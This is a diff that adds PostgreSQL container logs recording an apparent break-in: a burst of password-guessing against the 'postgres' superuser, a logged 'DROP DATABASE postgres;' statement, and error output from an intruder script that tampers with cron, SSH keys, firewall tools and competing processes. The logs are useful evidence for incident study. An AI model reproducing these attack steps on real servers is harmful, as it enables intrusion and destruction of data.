+postgres-1  | 2025-08-31 12:52:04.862 UTC [1] LOG:  listening on IPv4 address "0.0.0.0", port 5432
+postgres-1  | 2025-08-31 12:52:04.862 UTC [1] LOG:  listening on IPv6 address "::", port 5432
+postgres-1  | 2025-08-31 12:52:04.873 UTC [1] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+postgres-1  | 2025-08-31 12:52:04.887 UTC [25] LOG:  database system was shut down at 2025-08-31 12:39:15 UTC
+postgres-1  | 2025-08-31 12:52:04.929 UTC [1] LOG:  database system is ready to accept connections
+postgres-1  | 2025-08-31 12:52:12.832 UTC [1] LOG:  received fast shutdown request
+postgres-1  | 2025-08-31 12:52:12.839 UTC [1] LOG:  aborting any active transactions
+postgres-1  | 2025-08-31 12:52:12.880 UTC [1] LOG:  background worker "logical replication launcher" (PID 31) exited with exit code 1
+postgres-1  | 2025-08-31 12:52:12.882 UTC [26] LOG:  shutting down
+postgres-1  | 2025-08-31 12:52:12.924 UTC [1] LOG:  database system is shut down
+postgres-1  |
+postgres-1  | PostgreSQL Database directory appears to contain a database; Skipping initialization
+postgres-1  |
+postgres-1  | 2025-08-31 12:54:29.730 UTC [1] LOG:  starting PostgreSQL 13.22 on x86_64-pc-linux-musl, compiled by gcc (Alpine 14.2.0) 14.2.0, 64-bit
+postgres-1  | 2025-08-31 12:54:29.731 UTC [1] LOG:  listening on IPv4 address "0.0.0.0", port 5432
+postgres-1  | 2025-08-31 12:54:29.732 UTC [1] LOG:  listening on IPv6 address "::", port 5432
+postgres-1  | 2025-08-31 12:54:29.752 UTC [1] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+postgres-1  | 2025-08-31 12:54:29.773 UTC [25] LOG:  database system was shut down at 2025-08-31 12:52:12 UTC
+postgres-1  | 2025-08-31 12:54:29.805 UTC [1] LOG:  database system is ready to accept connections
+postgres-1  |
+postgres-1  | PostgreSQL Database directory appears to contain a database; Skipping initialization
+postgres-1  |
+postgres-1  | 2025-08-31 12:55:17.864 UTC [1] LOG:  starting PostgreSQL 13.22 on x86_64-pc-linux-musl, compiled by gcc (Alpine 14.2.0) 14.2.0, 64-bit
+postgres-1  | 2025-08-31 12:55:17.865 UTC [1] LOG:  listening on IPv4 address "0.0.0.0", port 5432
+postgres-1  | 2025-08-31 12:55:17.867 UTC [1] LOG:  listening on IPv6 address "::", port 5432
+postgres-1  | 2025-08-31 12:55:17.878 UTC [1] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+postgres-1  | 2025-08-31 12:55:17.895 UTC [26] LOG:  database system was interrupted; last known up at 2025-08-31 12:54:29 UTC
+postgres-1  | 2025-08-31 12:55:18.110 UTC [26] LOG:  database system was not properly shut down; automatic recovery in progress
+postgres-1  | 2025-08-31 12:55:18.115 UTC [26] LOG:  redo starts at 0/16029A0
+postgres-1  | 2025-08-31 12:55:18.116 UTC [26] LOG:  invalid record length at 0/16029D8: wanted 24, got 0
+postgres-1  | 2025-08-31 12:55:18.116 UTC [26] LOG:  redo done at 0/16029A0
+postgres-1  | 2025-08-31 12:55:18.164 UTC [1] LOG:  database system is ready to accept connections
+postgres-1  | 2025-08-31 14:35:58.167 UTC [146] LOG:  invalid length of startup packet
+postgres-1  | 2025-08-31 14:36:00.062 UTC [148] FATAL:  unsupported frontend protocol 255.255: server supports 2.0 to 3.0    
+postgres-1  | 2025-08-31 14:36:00.325 UTC [149] FATAL:  no PostgreSQL user name specified in startup packet
+postgres-1  | 2025-08-31 14:52:53.192 UTC [167] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 14:52:53.192 UTC [167] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 14:52:53.361 UTC [168] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 14:52:53.361 UTC [168] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 14:53:08.615 UTC [170] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 14:53:08.615 UTC [170] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 14:53:08.784 UTC [171] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 14:53:08.784 UTC [171] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 14:53:10.683 UTC [177] FATAL:  database "template0" is not currently accepting connections
+postgres-1  | 2025-08-31 14:53:11.379 UTC [180] ERROR:  cannot drop the currently open database
+postgres-1  | 2025-08-31 14:53:11.379 UTC [180] STATEMENT:  DROP DATABASE postgres;
+postgres-1  | 2025-08-31 15:37:33.445 UTC [362] FATAL:  unsupported frontend protocol 0.0: server supports 2.0 to 3.0        
+postgres-1  | 2025-08-31 15:37:36.187 UTC [363] FATAL:  unsupported frontend protocol 255.255: server supports 2.0 to 3.0    
+postgres-1  | 2025-08-31 15:37:37.048 UTC [364] FATAL:  no PostgreSQL user name specified in startup packet
+postgres-1  | 2025-08-31 17:28:38.442 UTC [810] FATAL:  unsupported frontend protocol 0.0: server supports 2.0 to 3.0        
+postgres-1  | 2025-08-31 17:28:38.785 UTC [811] FATAL:  unsupported frontend protocol 255.255: server supports 2.0 to 3.0    
+postgres-1  | 2025-08-31 17:28:39.129 UTC [812] FATAL:  no PostgreSQL user name specified in startup packet
+postgres-1  | 2025-08-31 17:29:32.839 UTC [817] FATAL:  expected password response, got message type 0
+postgres-1  | 2025-08-31 17:37:44.609 UTC [854] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:44.609 UTC [854] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:44.611 UTC [851] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:44.611 UTC [851] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:44.634 UTC [852] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:44.634 UTC [852] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:44.662 UTC [855] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:44.662 UTC [855] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:44.881 UTC [856] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:44.881 UTC [856] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:44.923 UTC [858] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:44.923 UTC [858] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:44.940 UTC [857] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:44.940 UTC [857] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:45.008 UTC [861] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:45.008 UTC [861] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:45.017 UTC [859] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:45.017 UTC [859] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:45.019 UTC [860] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:45.019 UTC [860] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:45.060 UTC [862] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:45.060 UTC [862] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:45.061 UTC [863] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:45.061 UTC [863] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:45.086 UTC [866] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:45.086 UTC [866] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:45.088 UTC [865] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:45.088 UTC [865] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:45.124 UTC [864] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:45.124 UTC [864] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:46.480 UTC [867] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:46.480 UTC [867] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:47.680 UTC [868] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:47.680 UTC [868] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:48.046 UTC [869] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:48.046 UTC [869] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:48.338 UTC [870] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:48.338 UTC [870] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:48.509 UTC [871] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:48.509 UTC [871] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:48.882 UTC [872] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:48.882 UTC [872] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:48.889 UTC [873] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:48.889 UTC [873] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:49.210 UTC [874] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:49.210 UTC [874] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:49.656 UTC [875] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:49.656 UTC [875] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:49.927 UTC [876] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:49.927 UTC [876] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:50.349 UTC [877] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:50.349 UTC [877] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:50.474 UTC [880] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:50.474 UTC [880] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:50.998 UTC [881] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:50.998 UTC [881] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:51.021 UTC [878] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:51.021 UTC [878] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:51.080 UTC [882] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:51.080 UTC [882] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:51.082 UTC [883] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:51.082 UTC [883] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:51.386 UTC [879] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:51.386 UTC [879] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:51.546 UTC [884] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:51.546 UTC [884] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:52.252 UTC [885] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:52.252 UTC [885] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:52.638 UTC [886] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:52.638 UTC [886] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:52.834 UTC [887] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:52.834 UTC [887] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:53.201 UTC [888] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:53.201 UTC [888] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:53.366 UTC [889] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:53.366 UTC [889] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:53.647 UTC [890] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:53.647 UTC [890] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:53.786 UTC [891] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:53.786 UTC [891] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:54.067 UTC [892] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:54.067 UTC [892] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:54.146 UTC [893] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:54.146 UTC [893] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:54.417 UTC [894] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:54.417 UTC [894] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:54.718 UTC [895] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:54.718 UTC [895] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:54.763 UTC [896] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:54.763 UTC [896] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:54.836 UTC [897] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:54.836 UTC [897] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:55.094 UTC [898] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:55.094 UTC [898] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:55.190 UTC [899] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:55.190 UTC [899] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:55.484 UTC [900] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:55.484 UTC [900] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:55.762 UTC [902] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:55.762 UTC [902] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:55.979 UTC [903] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:55.979 UTC [903] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:56.308 UTC [904] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:56.308 UTC [904] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:56.509 UTC [905] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:56.509 UTC [905] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:56.894 UTC [906] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:56.894 UTC [906] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:56.969 UTC [907] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:56.969 UTC [907] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:57.280 UTC [908] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:57.280 UTC [908] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:57.461 UTC [909] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:57.461 UTC [909] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:57.596 UTC [910] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:57.596 UTC [910] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:57.867 UTC [911] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:57.867 UTC [911] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:58.212 UTC [912] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:58.212 UTC [912] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:58.564 UTC [913] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:58.564 UTC [913] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:58.721 UTC [914] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:58.721 UTC [914] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:58.867 UTC [915] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:58.867 UTC [915] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:59.109 UTC [916] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:59.109 UTC [916] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:59.280 UTC [917] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:59.280 UTC [917] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:59.339 UTC [918] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:59.339 UTC [918] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:59.483 UTC [919] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:59.483 UTC [919] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:59.715 UTC [920] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:59.715 UTC [920] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:59.772 UTC [921] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:59.772 UTC [921] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:37:59.979 UTC [922] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:37:59.979 UTC [922] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 17:38:00.313 UTC [923] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 17:38:00.313 UTC [923] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | chattr: setting flags on /tmp/: Operation not permitted
+postgres-1  | chattr: setting flags on /var/tmp/: Operation not permitted
+postgres-1  | chattr: setting flags on /var/spool/cron: Operation not permitted
+postgres-1  | chattr: can't open '/var/spool/cron/crontabs': Symbolic link loop
+postgres-1  | chattr: can't stat '/etc/crontab': No such file or directory
+postgres-1  | bash: line 8: ufw: command not found
+postgres-1  | bash: line 9: iptables: command not found
+postgres-1  | bash: line 11: sudo: command not found
+postgres-1  | bash: line 12: /proc/sys/kernel/nmi_watchdog: Read-only file system
+postgres-1  | bash: line 13: /etc/sysctl.conf: Permission denied
+postgres-1  | bash: line 14: userdel: command not found
+postgres-1  | bash: line 15: userdel: command not found
+postgres-1  | chattr: can't stat '/root/.ssh/': Permission denied
+postgres-1  | chattr: can't stat '/root/.ssh/authorized_keys': Permission denied
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | sed: /tmp/.X11-unix/01: No such file or directory
+postgres-1  | cat: can't open '/tmp/.X11-unix/01': No such file or directory
+postgres-1  | sed: /tmp/.X11-unix/11: No such file or directory
+postgres-1  | cat: can't open '/tmp/.X11-unix/11': No such file or directory
+postgres-1  | sed: /tmp/.X11-unix/22: No such file or directory
+postgres-1  | cat: can't open '/tmp/.X11-unix/22': No such file or directory
+postgres-1  | sed: /tmp/.systemd.1: No such file or directory
+postgres-1  | cat: can't open '/tmp/.systemd.1': No such file or directory
+postgres-1  | sed: /tmp/.systemd.2: No such file or directory
+postgres-1  | cat: can't open '/tmp/.systemd.2': No such file or directory
+postgres-1  | sed: /tmp/.systemd.3: No such file or directory
+postgres-1  | cat: can't open '/tmp/.systemd.3': No such file or directory
+postgres-1  | cat: can't open '/tmp/.systemd.1': No such file or directory
+postgres-1  | kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... or kill -l [sigspec]
+postgres-1  | cat: can't open '/tmp/.systemd.2': No such file or directory
+postgres-1  | kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... or kill -l [sigspec]
+postgres-1  | cat: can't open '/tmp/.systemd.3': No such file or directory
+postgres-1  | kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... or kill -l [sigspec]
+postgres-1  | sed: /tmp/.pg_stat.0: No such file or directory
+postgres-1  | cat: can't open '/tmp/.pg_stat.0': No such file or directory
+postgres-1  | sed: /tmp/.pg_stat.1: No such file or directory
+postgres-1  | cat: can't open '/tmp/.pg_stat.1': No such file or directory
+postgres-1  | sed: /var/lib/postgresql/data/./oka.pid: No such file or directory
+postgres-1  | cat: can't open '/var/lib/postgresql/data/./oka.pid': No such file or directory
+postgres-1  | sed: /tmp/.ICE-unix/d: No such file or directory
+postgres-1  | cat: can't open '/tmp/.ICE-unix/d': No such file or directory
+postgres-1  | sed: /tmp/.ICE-unix/m: No such file or directory
+postgres-1  | cat: can't open '/tmp/.ICE-unix/m': No such file or directory
+postgres-1  | ps: unrecognized option: w
+postgres-1  | BusyBox v1.37.0 (2025-05-26 20:04:45 UTC) multi-call binary.
+postgres-1  |
+postgres-1  | Usage: ps [-o COL1,COL2=HEADER] [-T]
+postgres-1  |
+postgres-1  | Show list of processes
+postgres-1  |
+postgres-1  |   -o COL1,COL2=HEADER     Select columns for display
+postgres-1  |   -T                      Show threads
+postgres-1  | ps: unrecognized option: w
+postgres-1  | BusyBox v1.37.0 (2025-05-26 20:04:45 UTC) multi-call binary.
+postgres-1  |
+postgres-1  | Usage: ps [-o COL1,COL2=HEADER] [-T]
+postgres-1  |
+postgres-1  | Show list of processes
+postgres-1  |
+postgres-1  |   -o COL1,COL2=HEADER     Select columns for display
+postgres-1  |   -T                      Show threads
+postgres-1  | kill: invalid number 'USER'
+postgres-1  | grep: bad regex 'kworker -c\': Trailing backslash
+postgres-1  | kill: invalid number 'USER'
+postgres-1  | kill: invalid number 'postgres'
+postgres-1  | bash: line 312: systemctl: command not found
+postgres-1  | killall: log_rot: no process killed
